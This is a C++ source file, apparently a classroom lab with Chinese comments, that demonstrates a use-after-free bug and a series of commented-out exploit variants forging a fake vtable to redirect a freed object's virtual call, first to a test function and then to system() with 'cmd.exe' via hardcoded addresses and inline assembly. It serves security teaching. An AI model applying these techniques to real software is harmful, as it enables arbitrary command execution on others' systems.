#include <stdio.h>
#include <stdlib.h>
#include <string.h>

class CPerson {
public:

	CPerson()
	{
		printf("CPerson()\n");
		ShowSpeak();
	}

	virtual ~CPerson()
	{
		printf("~CPerson()\n");
		ShowSpeak();
	}

	virtual void ShowSpeak() {}
	virtual void ShowSpeak2(char *str) {}
	int m_nNumber;
};

class CChinese : public CPerson
{
public:
	CChinese() {}
	virtual ~CChinese() {}
	virtual void ShowSpeak()
	{
		printf("Speak Chinese\n");
	}

	virtual void ShowSpeak2(char *str)
	{
		printf("%s: Speak Chinese\n", str);
	}

	int m_nNumber;
};

class CAmerican : public CPerson
{
public:
	CAmerican() {
		m_nNumber = 0;
	}

	virtual ~CAmerican() {
		m_nNumber = 0;
	}

	virtual void ShowSpeak()
	{
		printf("Speak American\n");
	}

	virtual void ShowSpeak2(char *str)
	{
		printf("%s: Speak American\n", str);
	}

public:
	int m_nNumber;
};

void getit()
{
	printf("yes, you got it!\n");
	return;
}

int main(int argc, char *argv[])
{
	CPerson *Chinese = new CChinese;
	CPerson *American = new CAmerican;

	char *data, *hi = "Hello";

	printf("Chinese:%p\nAmerican:%p\n", Chinese, American);

	Chinese->ShowSpeak();

	delete Chinese;

	////利用，调用getit函数
	data = new char[sizeof(CChinese)];
	printf("data:%p\n", data);//data地址是0x00382E38
	printf("getit:%p\n", getit);//getit的地址是0x0040100F，不同环境可能会变化

	//直接使用American覆盖
	//调用Chinese->ShowSpeak后发现什么异常？
// 	memcpy(data, American, sizeof(CChinese));

	//exp1:写入硬编码地址，使用栈变量，模拟构造虚表结构和虚表指针
// 	int **vfptr;
// 	int vtable[3];
// 	vtable[2] = 0x0040100F;
// 	vfptr = (int **)&vtable;
// 	memcpy(data, &vfptr, sizeof(int*));
// 	Chinese->ShowSpeak();//如果该漏洞后续调用该函数

	//exp2:写入硬编码地址，使用堆变量，模拟构造虚表结构和虚表指针
// 	char *ptr = (char *)malloc(4);
// 	ptr[0]='\x0f';
// 	ptr[1]='\x10';
// 	ptr[2]='\x40';
// 	ptr[3]='\x00';
// 	memcpy(data, &ptr, 4);
// 	Chinese->ShowSpeak();//如果该漏洞后续调用该函数

	//exp3:写入硬编码地址，直接使用data的数据空间
// 	memcpy(data, "\x3c\x2e\x38\x00\x0f\x10\x40\x00\xa\xa\xa\xa", 12);//指向data的第4字节，第4-7字节放置getit的地址，第8-11字节空位，能否简化成8字节？
// 	Chinese->ShowSpeak();//如果该漏洞后续调用该函数

	//exp4:使用函数名字变量，使用栈变量，使用函数指针
// 	typedef void(func_fptr)();
// 	func_fptr *fptr = getit;
// 	char *pp = (char *)&fptr-8;
// 	memcpy(data, &pp, 4);
// 	Chinese->ShowSpeak();//如果该漏洞后续调用该函数

	//exp5:使用函数名字变量，使用栈变量，直接使用int类型
// 	int p = (int )getit;
// 	int *pp = (int *)&p-4;
// 	memcpy(data, &pp, 4);
// 	Chinese->ShowSpeak();//如果该漏洞后续调用该函数

	//exp6:使用函数名字变量，直接使用data
// 	*(int *)&data[4] = (int )getit;
// 	memcpy(data, &data, 12);
// 	Chinese->ShowSpeak();//如果该漏洞后续调用该函数

	//exp7:实现任意命令执行，将getit函数替换为system，考虑如何传递system的参数
	//为了避免传递参数，假设调用的是ShowSpeak2()函数，直接赋值参数字符串hi，使用静态字符串
// 	hi = "cmd.exe";
// 	*(int *)&data[4] = (int )system; //赋值偏移8字节，模拟虚表的第3项
// 	memcpy(data, &data, 12);
// 	Chinese->ShowSpeak2(hi); //如果该漏洞后续调用该函数
// 	//调用结束后，会发生崩溃，为什么，如何修改？

	//exp8:实现任意命令执行，将getit函数替换为system，考虑如何传递system的参数：静态字符串
	//依然使用ShowSpeak函数，手动传递参数
// 	*(int *)&data[4] = (int )system; //赋值偏移4字节，模拟虚表的第2项
// 	memcpy(data, &data, 12);
// 	char *cmd = "cmd.exe";
// 	__asm{
// 		push cmd;	//这样写在实际exp中可以吗？考虑静态字符串cmd.exe位于内存的哪里？该指令压入栈的是什么内容？
// 	}
// 	Chinese->ShowSpeak(); //该行代码由漏洞程序调用
// 	__asm{
// 		add esp, 4;
// 	}
// 	/*
// 	//为何没有崩溃？
// 	*/

	//exp9:实现任意命令执行，将getit函数替换为system，考虑如何传递system的参数：将字符串压栈
	//依然使用ShowSpeak函数，手动传递参数
// 	*(int *)&data[4] = (int )system; //赋值偏移4字节，模拟虚表的第2项
// 	memcpy(data, &data, 12);
// 	__asm{
// 		//如何传递参数?
// 	}
// 	Chinese->ShowSpeak();//该行代码有漏洞程序调用
// 	__asm{
// 		add esp, 4;
// 	}


	Chinese->ShowSpeak();

	return 0;
}